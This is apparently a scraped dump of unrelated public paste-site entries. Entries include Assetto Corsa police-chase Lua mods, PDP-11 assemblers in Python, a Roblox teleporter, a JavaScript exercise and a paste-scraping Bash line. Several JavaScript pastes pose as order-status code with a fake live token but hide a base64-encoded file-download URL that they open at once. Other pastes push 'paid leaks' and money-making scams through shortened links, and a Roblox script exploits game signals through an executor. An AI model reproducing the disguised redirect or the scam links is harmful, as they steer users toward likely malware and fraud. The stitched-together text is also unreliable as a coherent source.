    end
end

local function showPursuitMsg()
    local text = """"
    if chaseLVL.messageTimer > 0 then
        chaseLVL.messageTimer = chaseLVL.messageTimer - ui.deltaTime()
        text = chaseLVL.message
    end
    if pursuit.startedTime > 0 then
        if pursuit.suspect then
            text = ""You are chasing "" .. ac.getDriverName(pursuit.suspect.index) .. "" driving a "" .. string.gsub(string.gsub(ac.getCarName(pursuit.suspect.index), ""%W"", "" ""), ""  "", """") .. "" ! Get him! ""
        end
        if pursuit.startedTime > 6 then showPoliceLights() end
        if pursuit.engage and pursuit.startedTime < 8 then
            ac.sendChatMessage(formatMessage(msgEngage.msg[math.random(#msgEngage.msg)]))
            pursuit.engage = false
        end
    end
    if text ~= """" then
        local textLenght = ui.measureDWriteText(text, settings.fontSizeMSG)
        local rectPos1 = vec2(settings.msgOffsetX - textLenght.x/2, settings.msgOffsetY)
        local rectPos2 = vec2(settings.msgOffsetX + textLenght.x/2, settings.msgOffsetY + settings.fontSizeMSG)
        local rectOffset = vec2(10, 10)
        if ui.time() % 1 < 0.5 then
            ui.drawRectFilled(rectPos1 - vec2(10,0), rectPos2 + rectOffset, COLORSMSGBG, 10)
        else
            ui.drawRectFilled(rectPos1 - vec2(10,0), rectPos2 + rectOffset, rgbm(0,0,0,0.5), 10)
        end
        ui.dwriteDrawText(text, settings.fontSizeMSG, rectPos1, chaseLVL.color)
    end
end

local function arrestSuspect()
    if pursuit.hasArrested and pursuit.suspect then
        local msgToSend = formatMessage(msgArrest.msg[math.random(#msgArrest.msg)])
        table.insert(arrestations, msgToSend .. os.date(""\nDate of the Arrestation: %c""))
        ac.sendChatMessage(msgToSend .. ""\nPlease Get Back Pit, GG!"")
        pursuit.id = pursuit.suspect.sessionID
        if playerData.Arrests == nil then playerData.Arrests = 0 end
        playerData.Arrests = playerData.Arrests + 1
        pursuit.startedTime = 0
        pursuit.suspect = nil
        pursuit.timerArrest = 1
    elseif pursuit.hasArrested then
        if pursuit.timerArrest > 0 then
            pursuit.timerArrest = pursuit.timerArrest - ui.deltaTime()
        else
            acpPolice{message = ""BUSTED!"", messageType = 2, yourIndex = pursuit.id}
            pursuit.timerArrest = 0
            pursuit.suspect = nil
            pursuit.id = -1
            pursuit.hasArrested = false
            pursuit.startedTime = 0
            pursuit.enable = false
            pursuit.level = 1
            pursuit.nextMessage = 20
            pursuit.lostSight = false
            pursuit.timeLostSight = 0
            local data = {
                [""Arrests""] = playerData.Arrests,
            }
            updatefirebase()
            updatefirebaseData(""Arrests"", data)
        end
    end
end

local function chaseUpdate()
    if pursuit.startedTime > 0 then pursuit.startedTime = pursuit.startedTime - ui.deltaTime()
    else pursuit.startedTime = 0 end
    if pursuit.suspect then
        sendChatToSuspect()
        inRange()
    end
    arrestSuspect()
end

---------------------------------------------------------------------------------------------- Menu ----------------------------------------------------------------------------------------------

local function arrestLogsUI()
    ui.dwriteTextAligned(""Arrestation Logs"", 40, ui.Alignment.Center, ui.Alignment.Center, vec2(windowWidth/4,60), false, rgbm.colors.white)
    ui.drawLine(vec2(0,60), vec2(windowWidth/4,60), rgbm.colors.white, 1)
    ui.newLine(15)
    ui.sameLine(10)
    ui.beginGroup()
    local allMsg = """"
    ui.dwriteText(""Click on the button next to the message you want to copy."", 15, rgbm.colors.white)
    ui.sameLine(windowWidth/4 - 120)
    if ui.button('Close', vec2(100, windowHeight/50)) then arrestLogsOpen = false end
    for i = 1, #arrestations do
        if ui.smallButton(""#"" .. i .. "": "", vec2(0,10)) then
            ui.setClipboardText(arrestations[i])
        end
        ui.sameLine()
        ui.dwriteTextWrapped(arrestations[i], 15, rgbm.colors.white)
    end
    if #arrestations == 0 then
        ui.dwriteText(""No arrestation logs yet."", 15, rgbm.colors.white)
    end
    ui.newLine()
    if ui.button(""Set all messages to ClipBoard"") then
        for i = 1, #arrestations do
            allMsg = allMsg .. arrestations[i] .. ""\n\n""
        end
        ui.setClipboardText(allMsg)
    end
    ui.endGroup()
end

local buttonPos = windowWidth/65

local function camerasUI()
    ui.dwriteTextAligned(""Surveillance Cameras"", 40, ui.Alignment.Center, ui.Alignment.Center, vec2(windowWidth/6.5,60), false, rgbm.colors.white)
    ui.drawLine(vec2(0,60), vec2(windowWidth/6.5,60), rgbm.colors.white, 1)
    ui.newLine(20)
    ui.beginGroup()
    ui.sameLine(buttonPos)
    if ui.button('Close', vec2(windowWidth/6.5 - buttonPos*2,30)) then camerasOpen = false end
    ui.newLine()
    for i = 1, #cameras do
        local h = math.rad(cameras[i].dir + ac.getCompassAngle(vec3(0, 0, 1)))
        ui.newLine()
        ui.sameLine(buttonPos)
        if ui.button(cameras[i].name, vec2(windowWidth/6.5 - buttonPos*2,30)) then
            ac.setCurrentCamera(ac.CameraMode.Free)
            ac.setCameraPosition(cameras[i].pos)
            ac.setCameraDirection(vec3(math.sin(h), 0, math.cos(h))) 
            ac.setCameraFOV(cameras[i].fov)
        end
    end
    if ac.getSim().cameraMode == ac.CameraMode.Free then
        ui.newLine()
        ui.newLine()
        ui.sameLine(buttonPos)
        if ui.button('Police car camera', vec2(windowWidth/6.5 - buttonPos*2,30)) then ac.setCurrentCamera(ac.CameraMode.Cockpit) end
    end
end


local initialized = false
local menuSize = {vec2(windowWidth/4, windowHeight/3), vec2(windowWidth/6.4, windowHeight/2.2)}
local buttonPressed = false

local function moveMenu()
    if ui.windowHovered() and ui.mouseDown() then buttonPressed = true end
    if ui.mouseReleased() then buttonPressed = false end
    if buttonPressed then settings.menuPos = settings.menuPos + ui.mouseDelta() end
end

---------------------------------------------------------------------------------------------- updates ----------------------------------------------------------------------------------------------

function script.drawUI()
    if carID ~= valideCar[1] and carID ~= valideCar[2] and carID ~= valideCar[3] or cspVersion < cspMinVersion then return end
    if initialized and settings.policeSize then
        if firstload then
            firstload = false
            initsettings()
        end
        radarUI()
        if pursuit.suspect then showStarsPursuit() end
        showPursuitMsg()
        if settingsOpen then
            ui.toolWindow('settings', settings.menuPos, menuSize[2], true, function ()
                ui.childWindow('childsettings', menuSize[2], true, function () settingsWindow() moveMenu() end)
            end)
        elseif arrestLogsOpen then
            ui.toolWindow('ArrestLogs', settings.menuPos, menuSize[1], true, function ()
                ui.childWindow('childArrestLogs', menuSize[1], true, function () arrestLogsUI() moveMenu() end)
            end)
        elseif camerasOpen then
            ui.toolWindow('Cameras', settings.menuPos, menuSize[2], true, function ()
                ui.childWindow('childCameras', menuSize[2], true, function () camerasUI() moveMenu() end)
            end)
        end
    end
end

ac.onCarJumped(0, function (carid)
    if carID == valideCar[1] or carID == valideCar[2] or carID == valideCar[3]then
        if pursuit.suspect then lostSuspect() end
    end
end)

function script.update(dt)
    if carID ~= valideCar[1] and carID ~= valideCar[2] and carID ~= valideCar[3] or cspVersion < cspMinVersion then return end
    if not initialized then
        loadsettings()
        getFirebase()
        initialized = true
    else
        radarUpdate()
        chaseUpdate()
        --hidePlayers()
    end
end

if carID == valideCar[1] or carID == valideCar[2] or carID == valideCar[3] and cspVersion >= cspMinVersion then
    ui.registerOnlineExtra(ui.Icons.Settings, ""Settings"", nil, settingsWindow, nil, ui.OnlineExtraFlags.Tool, 'ui.WindowFlags.AlwaysAutoResize')
end"
iv0VrqGF,Make $1000 15-MINUTES (BEGINNER) Z2,1wide1,JavaScript,Thursday 3rd of April 2025 12:24:10 PM CDT," 
Pdf https://tinyurl.com/paidleaksss


q5H4tG2iY5
"
LTjWfyd6,pdp-11_my_code,Korotkodul,Python,Thursday 3rd of April 2025 12:16:06 PM CDT,"import re
import struct
from typing import List, Dict, Union


class PDP11Assembler:
    def __init__(self):
        self.labels: Dict[str, int] = {}
        self.current_address = 0o1000
        self.output_data: List[int] = []

        # Таблица команд с правильными опкодами
        self.commands = {
            'halt': {'opcode': 0o000000, 'args': []},
            'mov': {'opcode': 0o010000, 'args': ['ss', 'dd']},
            'add': {'opcode': 0o060000, 'args': ['ss', 'dd']},
        }

    def parse_operand(self, operand: str) -> Dict[str, Union[int, str]]:
        """"""Разбор операнда с правильными режимами адресации""""""
        if not operand:
            return {'mode': 0, 'reg': 0, 'value': 0}

        # Регистровая адресация (R0-R7)
        if re.match(r'^[rR][0-7]$', operand):
            return {'mode': 0, 'reg': int(operand[1]), 'value': 0}

        # Немедленная адресация (#n)
        if operand.startswith('#'):
            value = int(operand[1:])
            return {'mode': 0o27, 'reg': 0, 'value': value}  # Режим 27, регистр 0

        return {'mode': 0, 'reg': 0, 'value': 0}

    def assemble_instruction(self, command: List[str]) -> List[Union[int, str]]:
        """"""Генерация машинного кода с правильным форматом""""""
        if not command:
            return []

        cmd_name = command[0].lower()
        if cmd_name not in self.commands:
            return []

        cmd_info = self.commands[cmd_name]
        args = command[1:]

        if len(args) != len(cmd_info['args']):
            return []

        words = []
        opcode = cmd_info['opcode']

        if cmd_name == 'halt':
            words.append(0o000000)
            return words

        if cmd_name == 'mov':
            src = self.parse_operand(args[0])
            dst = self.parse_operand(args[1])

            # Правильное кодирование для MOV
            instruction = opcode | (src['mode'] << 6) | (dst['reg'] << 3) | dst['mode']
            words.append(instruction)

            if src['mode'] == 0o27:  # Немедленная адресация
                words.append(src['value'])

            return words

        if cmd_name == 'add':
            src = self.parse_operand(args[0])
            dst = self.parse_operand(args[1])

            # Правильное кодирование для ADD
            instruction = opcode | (src['reg'] << 6) | dst['reg']
            words.append(instruction)

            return words

        return []

    def first_pass(self, lines: List[str]):
        """"""Первый проход: сбор меток""""""
        self.current_address = 0o1000
        for line in lines:
            line = line.strip()
            if not line or line.startswith(';'):
                continue

            if ':' in line:
                label, _ = line.split(':', 1)
                self.labels[label.strip()] = self.current_address
                line = line.split(':', 1)[1].strip()
                if not line:
                    continue

            parts = re.split(r'[,\s]+', line)
            cmd = parts[0].lower()

            if cmd in self.commands:
                self.current_address += 2
                if cmd == 'mov' and parts[1].startswith('#'):
                    self.current_address += 2

    def second_pass(self, lines: List[str]):
        """"""Второй проход: генерация кода""""""
        self.current_address = 0o1000
        for line in lines:
            line = line.strip()
            if not line or line.startswith(';'):
                continue

            if ':' in line:
                line = line.split(':', 1)[1].strip()
                if not line:
                    continue

            parts = re.split(r'[,\s]+', line)
            machine_code = self.assemble_instruction(parts)

            for word in machine_code:
                self.output_data.append(word)
                self.current_address += 2

    def write_output_file(self, filename: str):
        """"""Запись в файл в нужном формате""""""
        data_bytes = bytearray()
        for word in self.output_data:
            data_bytes.extend(struct.pack('<H', word))  # Little-endian

        with open(filename, 'w') as f:
            # Первая строка: адрес и размер
            f.write(f""0200 {len(data_bytes):04x}\n"")

            # Байты машинного кода
            for byte in data_bytes:
                f.write(f""{byte:02x}\n"")

    def assemble(self, input_filename: str, output_filename: str):
        """"""Основной метод ассемблирования""""""
        with open(input_filename, 'r') as f:
            lines = f.readlines()

        self.first_pass(lines)
        self.second_pass(lines)
        self.write_output_file(output_filename)


# Пример использования
if __name__ == ""__main__"":
    assembler = PDP11Assembler()

    test_code = """"""
        mov #2, r0
        mov #3, r1
        add r0, r1
        halt
    """"""

    with open(""test.asm"", ""w"") as f:
        f.write(test_code)

    assembler.assemble(""test.asm"", ""output.txt"")
    print(""Ассемблирование завершено. Результат в output.txt"")"
wbiTc13P,*PHP & MySQL: The ULTIMATE Course,f0f077,MySQL,Thursday 3rd of April 2025 12:10:17 PM CDT," **PHP & MySQL: The ULTIMATE Course**  
 **Build Modern, Dynamic Websites from Scratch**  

🚀 **Master PHP & MySQL** and create powerful, database-driven web applications with this **complete, project-based training**—the most comprehensive course online!  

 **🔥 What You’ll Learn**  
✔ **PHP Fundamentals** – Master syntax, functions, OOP, and modern PHP features  
✔ **MySQL & Databases** – Design, query, and manage databases like a pro  
✔ **Security Best Practices** – Prevent SQL injection, XSS, and secure user data  
✔ **User Authentication** – Logins, sessions, cookies, and password hashing  
✔ **CRUD Operations** – **Create, Read, Update, Delete** data dynamically  
✔ **Email Integration** – Send emails (transactional, notifications, etc.)  
✔ **Real-World Projects** – Build a **blog, user system, e-commerce features**, and more!  

 **💡 Why This Course?**  
✅ **Hands-On Learning** – No fluff, just **practical, project-based training**  
✅ **From Zero to Deployment** – Learn everything needed to **launch a live website**  
✅ **Industry Best Practices** – Write clean, efficient, and secure code 
 

✅ **Lifetime Access** – Keep all updates & downloadable resources  

 **🛠 Tools & Technologies**  
- **PHP 8+** (Latest features & optimizations)  
- **MySQL & PDO** (Safe, efficient database interactions)  
- **HTML/CSS/JS Integration** (Full-stack development)  
- **Git & Deployment** (Host your projects online)  

 **🎁 Bonus Content**  
📂 **Downloadable Code & Cheat Sheets**  
🔄 **Real-World Case Studies**  
🆘 **24/7 Support & Community Access**  

 **🚀 Ready to Become a PHP Pro? Enroll Now!**  
🔗 **Get Started Today** → https://short-jambo.ink/zpBS]  

📅 **Last Updated: [Current Date]**  

---
 **🔍 Perfect For:**  
- **Beginners** wanting to learn backend development  
- **Frontend devs** expanding into full-stack  
- **Freelancers** looking to build dynamic websites  
- **Career changers** entering web development  

💬 **Need more details? Ask away!** I can adjust the tone, add pricing, or include sample projects. 😊  
 
PHP, MySQL, Web Development, Backend Development, PHP Course, Database Programming, SQL, Dynamic Websites, PHP Tutorial, Full-Stack Development, CRUD, User Authentication, PHP Projects, PDO, Secure Coding, Website Security, OOP PHP, Blog System, E-Commerce PHP, Coding Bootcamp
for more:https://short-jambo.ink/2VoWz4"
rSdUc4n8,Binance account XL,1wide1,JavaScript,Thursday 3rd of April 2025 12:08:15 PM CDT," 
Pdf https://tinyurl.com/paidleaksss


0DFYNtdexX
"
xUSQbfCN,Teleporter script,TotallyGames,Lua,Thursday 3rd of April 2025 11:36:20 AM CDT,"local TeleportService = game:GetService(""TeleportService"")
local targetPlaceId = 98478818876957 --ID  вашего плейса

script.Parent.Touched:Connect(function(hit)
	local player = game.Players:GetPlayerFromCharacter(hit.Parent)
	if player then
		TeleportService:Teleport(targetPlaceId, player)
	end
end)"
vH2ZDrJA,pdp-11_1,Korotkodul,Python,Thursday 3rd of April 2025 10:59:09 AM CDT,"from pyparsing import (Word, Literal, Optional, Group, OneOrMore,
                      alphas, nums, hexnums, Combine, Suppress, ParseException,
                      restOfLine)
import struct
import re

# Конфигурация парсера
octal_number = Combine(Literal('0') + Word('01234567')).setParseAction(lambda t: int(t[0], 8))
decimal_number = Word(nums).setParseAction(lambda t: int(t[0]))
hex_number = Combine(Literal('0') + (Literal('x') | Literal('X')) + Word(hexnums)).setParseAction(lambda t: int(t[0], 16))
number = octal_number | hex_number | decimal_number

register = Word('Rr', nums, max=2).setParseAction(lambda t: f""R{t[0][1:]}"")
indirect = Suppress('(') + register + Suppress(')')
auto_dec = Suppress('-(') + register + Suppress(')')
auto_inc = Suppress('(') + register + Suppress(')+')
indirect_inc = Suppress('@(') + register + Suppress(')+')
immediate = Suppress('#') + number

operand = (indirect_inc | auto_dec | auto_inc | indirect | immediate | register | number)

instruction = Word(alphas.upper(), max=4)
instr_operands = Group(Optional(operand + Optional(Suppress(',') + Optional(operand))))
comment = Suppress(';') + restOfLine
assembly_line = instruction(""opcode"") + instr_operands(""operands"") + Optional(comment)

# Таблица опкодов PDP-11 (расширенная)
OPCODES = {
    'MOV': 0o010000, 'MOVB': 0o110000,
    'ADD': 0o060000, 'SUB': 0o160000,
    'CMP': 0o020000, 'CMPB': 0o120000,
    'BIT': 0o030000, 'BITB': 0o130000,
    'BIC': 0o040000, 'BICB': 0o140000,
    'BIS': 0o050000, 'BISB': 0o150000,
    'CLR': 0o005000, 'CLRB': 0o105000,
    'COM': 0o005100, 'COMB': 0o105100,
    'INC': 0o005200, 'INCB': 0o105200,
    'DEC': 0o005300, 'DECB': 0o105300,
    'NEG': 0o005400, 'NEGB': 0o105400,
    'ADC': 0o005500, 'ADCB': 0o105500,
    'SBC': 0o005600, 'SBCB': 0o105600,
    'TST': 0o005700, 'TSTB': 0o105700,
    'ROR': 0o006000, 'RORB': 0o106000,
    'ROL': 0o006100, 'ROLB': 0o106100,
    'ASR': 0o006200, 'ASRB': 0o106200,
    'ASL': 0o006300, 'ASLB': 0o106300,
    'BR': 0o000400, 'BNE': 0o001000,
    'JMP': 0o000100, 'JSR': 0o004000,
    'RTS': 0o000200, 'HALT': 0o000000
}

# Режимы адресации
ADDR_MODES = {
    'R0': 0o00, 'R1': 0o01, 'R2': 0o02, 'R3': 0o03,
    'R4': 0o04, 'R5': 0o05, 'R6': 0o06, 'R7': 0o07,
    '(R0)': 0o10, '(R1)': 0o11, '(R2)': 0o12, '(R3)': 0o13,
    '(R4)': 0o14, '(R5)': 0o15, '(R6)': 0o16, '(R7)': 0o17,
    '-(R0)': 0o20, '-(R1)': 0o21, '-(R2)': 0o22, '-(R3)': 0o23,
    '-(R4)': 0o24, '-(R5)': 0o25, '-(R6)': 0o26, '-(R7)': 0o27,
    '(R0)+': 0o30, '(R1)+': 0o31, '(R2)+': 0o32, '(R3)+': 0o33,
    '(R4)+': 0o34, '(R5)+': 0o35, '(R6)+': 0o36, '(R7)+': 0o37,
    '@(R0)+': 0o40, '@(R1)+': 0o41, '@(R2)+': 0o42, '@(R3)+': 0o43,
    '@(R4)+': 0o44, '@(R5)+': 0o45, '@(R6)+': 0o46, '@(R7)+': 0o47,
    '#': 0o50
}


def encode_operand(op):
    """"""Кодирует операнд в режим адресации и дополнительное слово""""""
    if isinstance(op, int):
        return 0o67, op  # Непосредственная адресация (абсолютный режим)

    if op.startswith('R'):
        return ADDR_MODES[op], 0

    if op.startswith('('):
        if op.startswith('-('):
            return ADDR_MODES[f""-({op[3:-1]})""], 0
        elif op.endswith(')+'):
            if op.startswith('@'):
                return ADDR_MODES[f""@({op[3:-2]})+""], 0
            return ADDR_MODES[f""({op[1:-2]})+""], 0
        return ADDR_MODES[f""({op[1:-1]})""], 0

    if op.startswith('#'):
        return ADDR_MODES['#'], int(op[1:])

    return 0o67, int(op)  # Абсолютная адресация


def assemble_instruction(parsed_line, pc, labels):
    """"""Генерирует машинный код для одной инструкции""""""
    try:
        opcode = parsed_line.opcode
        operands = parsed_line.operands.asList() if parsed_line.operands else []

        if opcode not in OPCODES:
            raise ValueError(f""Неизвестная инструкция: {opcode}"")

        base_op = OPCODES[opcode]

        # Обработка инструкций без операндов
        if opcode in ['HALT', 'NOP', 'RTS']:
            return struct.pack('<H', base_op)

        # Обработка ветвлений
        if opcode in ['BR', 'BNE', 'BEQ', 'BPL', 'BMI']:
            if not operands:
                raise ValueError(f""Отсутствует операнд для инструкции {opcode}"")
            offset = labels.get(operands[0], pc) - pc
            return struct.pack('<H', base_op | (offset & 0o377))

        # Обработка инструкций с одним операндом
        if len(operands) == 1:
            mode, value = encode_operand(operands[0])
            instruction = base_op | (mode << 6)
            machine_code = struct.pack('<H', instruction)
            if mode == 0o67 or (mode == 0o50 and value > 0o177777):
                machine_code += struct.pack('<H', value)
            return machine_code

        # Обработка инструкций с двумя операндами
        if len(operands) == 2:
            src_mode, src_value = encode_operand(operands[0])
            dst_mode, dst_value = encode_operand(operands[1])
            instruction = base_op | (src_mode << 6) | dst_mode
            machine_code = struct.pack('<H', instruction)

            # Добавляем дополнительные слова для операндов
            if src_mode == 0o67 or (src_mode == 0o50 and src_value > 0o177777):
                machine_code += struct.pack('<H', src_value)
            if dst_mode == 0o67 or (dst_mode == 0o50 and dst_value > 0o177777):
                machine_code += struct.pack('<H', dst_value)

            return machine_code

        raise ValueError(f""Неподдерживаемое количество операндов для {opcode}"")

    except ParseException as e:
        print(f""Ошибка разбора строки: {e}"")
        return None


def assemble_file(input_file, output_file):
    """"""Основная функция ассемблирования""""""
    labels = {}
    pc = 0

    # Первый проход: сбор меток
    with open(input_file, 'r') as f:
        for line_num, line in enumerate(f, 1):
            line = re.sub(r';.*', '', line).strip()
            if not line:
                continue

            # Обработка меток
            if ':' in line:
                label, _ = line.split(':', 1)
                labels[label.strip()] = pc
                line = line.split(':', 1)[1].strip()
                if not line:
                    continue

            try:
                parsed = assembly_line.parseString(line)
                if parsed.opcode in OPCODES:
                    pc += 2  # Базовый размер инструкции
                    # Учет дополнительных слов
                    if parsed.operands:
                        ops = parsed.operands.asList()
                        for op in ops:
                            if isinstance(op, str) and op.startswith('#'):
                                value = int(op[1:])
                                if value > 0o177777:
                                    pc += 2
                            elif not any(c.isalpha() for c in str(op)):
                                pc += 2
            except ParseException:
                continue

    # Второй проход: генерация кода
    with open(input_file, 'r') as f_in, open(output_file, 'wb') as f_out:
        pc = 0
        for line_num, line in enumerate(f_in, 1):
            line = re.sub(r';.*', '', line).strip()
            if not line:
                continue

            # Пропускаем строки с метками
            if ':' in line:
                line = line.split(':', 1)[1].strip()
                if not line:
                    continue

            try:
                parsed = assembly_line.parseString(line)
                machine_code = assemble_instruction(parsed, pc, labels)
                if machine_code:
                    f_out.write(machine_code)
                    pc += len(machine_code)
            except (ParseException, ValueError) as e:
                print(f""Ошибка в строке {line_num}: {e}"")


# Пример программы на PDP-11
sample_program = """"""
    MOV #1000, R0    ; Загрузить значение в R0
    LOOP:
    ADD R1, R0       ; Добавить R1 к R0
    CMP R0, #2000    ; Сравнить с 2000
    BNE LOOP         ; Повторять если не равно
    HALT             ; Останов
""""""

# Сохраняем пример в файл
with open(""pdp11_sample.asm"", ""w"") as f:
    f.write(sample_program)

# Ассемблируем
assemble_file(""pdp11_sample.asm"", ""pdp11_output.bin"")
print(""Ассемблирование завершено. Результат в pdp11_output.bin"")"
9m9Twvec,Untitled,Onesible,JavaScript,Thursday 3rd of April 2025 10:42:33 AM CDT,"function attachEvents() {
    let postUrl = 'http://localhost:3030/jsonstore/blog/posts';
    let commentsUrl = 'http://localhost:3030/jsonstore/blog/comments';

    document.getElementById('btnLoadPosts').addEventListener('click', () => { onPostsRequest(postUrl) });
    document.getElementById('btnViewPost').addEventListener('click', () => { onViewPost(commentsUrl) });
}

async function onPostsRequest(url) {
    let data;

    try {
        let response = await fetch(url);
        data = await response.json();
    } catch {
        return;
    }

    let selectPost = document.getElementById('posts');

    for (let [key, value] of Object.entries(data)) {
        let option = document.createElement('option');

        option.textContent = value.title;
        option.value = key;

        selectPost.appendChild(option);
    }
}

async function onViewPost(url) {
    let post = document.getElementById('posts');
    let postComments;
    let postData;

    try {
        const [postResponse, commentsResponse] = await Promise.all([
            fetch('http://localhost:3030/jsonstore/blog/posts'),
            fetch(url)
        ]);

        postData = await postResponse.json();

        let commentsData = await commentsResponse.json();
        postComments = Object.values(commentsData).filter(comment => comment.postId === post.value);
    } catch {
        return;
    }

    // Fetch-вах поста с URL-а + post.value и после долните две ги сетвах
    // с postData.title и postData.body. При мен се показваше правилно,
    // 3ти и 4ти тест не минаваха.

    document.getElementById('post-title').textContent = post.selectedOptions[0].textContent;
    document.getElementById('post-body').textContent = postData[post.value].body;
    
    let comments = document.getElementById('post-comments');
    comments.replaceChildren();

    for (let comment of postComments) {
        let li = document.createElement('li');
        li.textContent = comment.text;
        li.id = comment.id;

        comments.appendChild(li);
    }
}   

attachEvents();"
vzfwvuSK,Untitled,kammex,JavaScript,Thursday 3rd of April 2025 10:26:39 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/095/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
wRxDmfyb,replicatesignal_commands-01,Dark_Agent,Lua,Thursday 3rd of April 2025 09:57:56 AM CDT,"if getgenv then
    MS = getgenv()
elseif shared then
    MS = shared
elseif _G then
    MS = _G
else
    warn(""Your exec does not support these features: getgenv, shared, _G!"")
    return
end

MS.pd = function()
    if replicatesignal then
        replicatesignal(game.Players.LocalPlayer.ConnectDiedSignalBackend)
    else
        warn(""replicatesignal not supported 💥"")
    end
    wait(game.Players.RespawnTime + 0.1)
    game.Players.LocalPlayer.Character:FindFirstChildOfClass(""Humanoid""):ChangeState(15)
end

MS.nopd = function()
    replicatesignal(game.Players.LocalPlayer.ConnectDiedSignalBackend)
end

MS.instantre = function()
    h = game.Players.LocalPlayer.Character.HumanoidRootPart
    cam = workspace.CurrentCamera
    if replicatesignal then
        replicatesignal(game.Players.LocalPlayer.ConnectDiedSignalBackend)
    else
        warn(""Can't do InstantRespawn because replicatesignal function not supported"")
    end
    wait(game.Players.RespawnTime - 0.165)
    game.Players.LocalPlayer.Character:FindFirstChildOfClass(""Humanoid""):ChangeState(15)
    wait(0.5)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = h.CFrame
    workspace.CurrentCamera = cam
end

MS.breakjoints = function()
    replicatesignal(game.Players.LocalPlayer.Character.Humanoid.ServerBreakJoints)
end

wait(0.5) --wait 0.5s
print("" ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ "")
print("" "")
print(""Commands: breakjoints(), instantre(), nopd(), pd()"")
print("" "")
print("" ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ "")
"
2V0F9CcS,Scraping Pastes,metalx1000,Bash,Thursday 3rd of April 2025 09:37:47 AM CDT,"#!/bin/bash
######################################################################
#Copyright (C) 2025  Kris Occhipinti
#https://filmsbykris.com

#This program is free software: you can redistribute it and/or modify
#it under the terms of the GNU General Public License as published by
#the Free Software Foundation version 3 of the License.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.
######################################################################
domain=""http://pastebin.com""
user=""metalx1000""
url=""${domain}/u/${user}""

wget -qO- ""$url"" | grep -A 1 ""Public paste"" | grep href | sed ""s|<a href=\""|$domain|g;s/\"">/|/g;s|</a>    </td>||g""
"
RPRA0JPM,Untitled,dentira,JavaScript,Thursday 3rd of April 2025 09:08:47 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/859/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GbeUrXB5,police,supinus,Lua,Thursday 3rd of April 2025 09:00:53 AM CDT,"-- cops_vs_robbers.lua
-- Place this file inside: assettocorsa/server/extension/lua/

local cops = {}
local robbers = {}
local busted = {}

-- Menu d'équipe
function script.update(dt)
    for i = 0, ac.getCarCount() - 1 do
        local car = ac.getCar(i)
        if not cops[i] and not robbers[i] then
            ui.begin(""Choisissez votre équipe"", true, WindowFlags.AlwaysAutoResize)
            ui.text(""Vous êtes : "" .. car.name)
            if ui.button(""🚓 Rejoindre les flics"") then
                cops[i] = true
                ac.setCarNameTag(i, ""🚓 Police"")
            end
            if ui.button(""💨 Rejoindre les fuyards"") then
                robbers[i] = true
                ac.setCarNameTag(i, ""💨 Fuyard"")
            end
            ui.endWindow()
        end
    end

    -- Vérifier collisions
    for i = 0, ac.getCarCount() - 1 do
        if cops[i] then
            local copCar = ac.getCar(i)
            for j = 0, ac.getCarCount() - 1 do
                if robbers[j] and not busted[j] then
                    local robberCar = ac.getCar(j)
                    if copCar:wasInContactWith(j) then
                        busted[j] = true
                        ac.setCarNameTag(j, ""❌ Busté"")
                        ac.sendChatMessage(string.format(""💥 %s a été attrapé par %s!"", robberCar.name, copCar.name))
                    end
                end
            end
        end
    end

    -- Vérifier victoire
    local remaining = 0
    for i = 0, ac.getCarCount() - 1 do
        if robbers[i] and not busted[i] then
            remaining = remaining + 1
        end
    end

    if remaining == 0 and tableLength(robbers) > 0 then
        ac.sendChatMessage(""🚨 Tous les fuyards ont été attrapés ! Victoire des flics !"")
        ac.setSessionOver()
    end
end

function tableLength(t)
    local count = 0
    for _, _ in pairs(t) do count = count + 1 end
    return count
end
"
hBRKM93s,Market.js,Epiphemeral,JavaScript,Thursday 3rd of April 2025 08:52:31 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/769/status"";
